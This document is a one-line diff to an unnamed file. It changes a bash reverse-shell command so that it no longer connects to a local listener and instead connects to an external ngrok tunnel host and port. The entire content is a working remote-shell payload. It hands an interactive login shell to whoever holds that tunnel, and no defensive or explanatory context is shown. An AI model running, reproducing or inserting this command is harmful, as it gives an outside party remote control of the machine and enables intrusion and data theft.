@@ -1,1 +1,1 @@
-bash -l > /dev/tcp/127.0.0.1/9004 0<&1 2>&1
+bash -l > /dev/tcp/8.tcp.ngrok.io/12555 0<&1 2>&1
